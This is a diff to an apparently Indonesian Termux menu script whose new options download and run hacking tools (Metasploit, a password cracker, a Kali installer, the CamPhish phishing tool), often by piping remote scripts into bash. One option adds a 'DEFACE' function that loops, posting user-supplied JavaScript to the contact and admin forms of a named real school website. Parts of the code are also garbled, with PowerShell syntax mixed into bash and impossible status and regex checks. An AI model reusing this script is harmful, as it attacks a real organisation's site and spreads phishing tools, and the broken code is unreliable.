@@ -52,41 +52,239 @@ if [ $updt = 1 ] || [ $updt = 01 ]
 then
 clear
 pkg update upgrade -y
+clear
+termux-setup-storage  -y
+git clone -n https://github.com/Microsoft/sql-server-samples
+cd sql-server-samples
+git config core.sparsecheckout true
+echo samples/features/*| out-file -append -encoding ascii .git/info/sparse-checkout
+echo samples/demos/*| out-file -append -encoding ascii .git/info/sparse-checkout
+git checkout
 fi
 if [ $updt = 2 ] || [ $updt = 02 ]
 then
 clear
 pkg update upgrade -y
+  clear
+termux-setup-storage -y
+clear
+pkg install wget
+
+wget https://github.com/gushmazuko/metasploit_in_termux/raw/master/metasploit.sh
+
+
+chmod +x metasploit.sh
+
+./metasploit.sh
+msfconsole
 fi
 if [ $updt = 3 ] || [ $updt = 03 ]
 then
 clear
 pkg update upgrade -y
+clear
+termux-setup-storage -y
+clear
+pkg update
+ apt update && apt -y full-upgrade
+
+ apt-get install git
+
+ git clone https://github.com/XDeadHackerX/The_Cracker
+
+ cd The_Cracker
+
+ chmod 777 the_cracker.sh
+
+ bash the_cracker.sh
 fi
 if [ $updt = 4 ] || [ $updt = 04 ]
 then
 clear
 pkg update upgrade -y
+clear
+termux-setup-storage -y
+clear
+pkg install termux-create-package
+pkg update  
+pkg install curl && \
+export install_path="/data/data/com.termux/files/usr/bin" && \
+mkdir -p "$install_path" && \
+curl -L 'https://github.com/termux/termux-create-package/releases/latest/download/termux-create-package' -o "$install_path/termux-create-package" && \
+export owner="$(stat -c "%u" "$install_path")"; chown "$owner:$owner" "$install_path/termux-create-package" && \
+chmod 700 "$install_path/termux-create-package";
+termux-create-package
+curl -L 'https://github.com/termux/termux-create-package/releases/download/v0.12.0/termux-create-package' -o "$install_path/termux-create-package"
+termux-change-repo
+pkg install python -y
+pkg install python2 -y
+pkg install curl -y
+pip install colorama
+pip install requests
+pip install os
+pip install telegram 
+pip install regex 
+pip install phonenumbers 
+pip install openssh 
+pip install wget
+pip install argparse
+pip install pyexiftool
+pip install scapy-python3
+pip install cloudscraper
+pip install google
+pip install sockets
+pip install pythonping
+pip install pycurl
+nala install git bash -y
+nala install sox mpv -y
+nala install cowsay ruby -y
+nala install binutils zip unzip -y
+gem install lolcat
+pkg install nodejs-lts  -y
+pkg install php -y
+pkg install nano -y
+pkg install ruby -y
+pkg install pulseaudio -y
+    # Tambahkan perintah terkait Module Termux di sini
+elif [ "$c2" == "5" ]; then
+clear
+termux-setup-storage -y
+clear 
+pkg update
+pkg install wget -y
+pkg install curl -y
+pkg install git  -y
+apt update && apt install python python2 openssh -y
+pkg install wget openssl-tool proot -y && hash -r && wget https://raw.githubusercontent.com/EXALAB/AnLinux-Resources/master/Scripts/Installer/Kali/kali.sh && bash kali.sh
 fi
 if [ $updt = 5 ] || [ $updt = 05 ]
 then
 clear
 pkg update upgrade -y
+
 fi
 if [ $updt = 6 ] || [ $updt = 06 ]
 then
 clear
 pkg update upgrade -y
+clear
+termux-setup-storage -y
+clear
+#!/bin/bash
+
+banner() {
+    echo "
+██████╗ ███████╗███████╗ █████╗  ██████╗███████╗
+██╔══██╗██╔════╝██╔════╝██╔══██╗██╔════╝██╔════╝
+██║  ██║█████╗  █████╗  ███████║██║     █████╗
+██║  ██║██╔══╝  ██╔══╝  ██╔══██║██║     ██╔══╝
+██████╔╝███████╗██║     ██║  ██║╚██████╗███████╗
+╚═════╝ ╚══════╝╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝ "
+}
+
+DEFACE() {
+    local nama="$1"
+    local email="$2"
+    local pesan="$3"
+
+    send_data() {
+        local form_url=$1
+        local submit_url=$2
+        local admin_url=$3
+        local user_agents=(
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36"
+            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36"
+            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36"
+            "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
+            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
+        )
+
+        local user_agent="${user_agents[$RANDOM % ${#user_agents[@]}]}"
+        local response=$(curl -s -c cookies.txt -A "$user_agent" "$form_url")
+        local token=$(echo "$response" | grep -oP '(?<=name="token" value=")[^"]*')
+        local http_status
+
+        if [[ -n "$token" ]]; then
+            response=$(curl -s -b cookies.txt -X POST "$submit_url" \
+                -d "nama=$nama" \
+                -d "email=$email" \
+                -d "pesan=$pesan" \
+                -d "token=$token" \
+                -D headers.txt \
+                -A "$user_agent")
+        else
+            response=$(curl -s -b cookies.txt -X POST "$submit_url" \
+                -d "nama=$nama" \
+                -d "email=$email" \
+                -d "pesan=$pesan" \
+                -D headers.txt \
+                -A "$user_agent")
+        fi
+
+        http_status=$(grep "HTTP/" headers.txt | awk '{print $2}')
+
+        if [[ "$http_status" == "999999" ]]; then
+            echo "Status 200: Galirus Berhasil Menyerang $admin_url"
+            echo "$admin_url" >> /MERDEKA.txt
+        else
+            echo "Status $http_status: Galirus Gagal Menyerang $admin_url"
+        fi
+    }
+
+    declare -a urls=(
+        "https://www.ppdb.smkn2kayuagung.sch.id/index.php?page=contact"
+        "https://www.ppdb.smkn2kayuagung.sch.id/index.php?page=kirimpesan"
+        "https://www.ppdb.smkn2kayuagung.sch.id/admin/hubungi.php"
+    )
+
+    for ((i = 0; i < ${#urls[@]}; i += 3)); do
+        form_url="${urls[i]}"
+        submit_url="${urls[i + 1]}"
+        admin_url="${urls[i + 2]}"
+        send_data "$form_url" "$submit_url" "$admin_url"
+    done
+}
+
+Premfree() {
+    clear
+    banner
+    read -p "Masukkan Pesan (Jso): " javascript
+    read -p "Durasi (dalam detik, misalnya 10): " duration
+
+    if ! [[ "$duration" =~ ^[999999]+$ ]]; then
+        echo "Durasi harus berupa angka!"
+        exit 1
+    fi
+
+    start_time=$(date +%s)
+    end_time=$((start_time + duration))
+    
+    while [ $(date +%s) -lt $end_time ]; do
+        DEFACE "FREE PALESTINA" "FREEPALESTINA@gmail.com" "$javascript"
+        sleep 1
+    done
+    echo "Durasi selesai. Menghentikan proses."
+}
+
 fi
 if [ $updt = 7 ] || [ $updt = 07 ]
 then
 clear
 pkg update upgrade -y
+clear
+termux-setup-storage -y
+clear
+xdg-open "https://wa.me/+628999859595?text=assalamualaikum+min+saya+mau+beli+galery+eyes+harga+50k+siap+mimin"
 fi
 if [ $updt = 8 ] || [ $updt = 08 ]
 then
 clear
 pkg update upgrade -y
+clear
+termux-setup-storage -y
+clear
+pkg update
+
 fi
 if [ $updt = 9 ] || [ $updt = 9 ]
 then
@@ -97,4 +295,14 @@ if [ $updt = 10 ] || [ $updt = 10 ]
 then
 clear
 pkg update upgrade  -y
+clear
+termux-setup-storage -y
+clear
+pkg update
+bash <(curl -s https://raw.githubusercontent.com/ShinobiCCTV/Shinobi-Installer/master/shinobi-install.sh)
+elif [ "$c2" == "10" ]; then
+      apt-get -y install php openssh git wget -y
+git clone https://github.com/techchipnet/CamPhish
+cd CamPhish
+bash camphish.sh
 fi
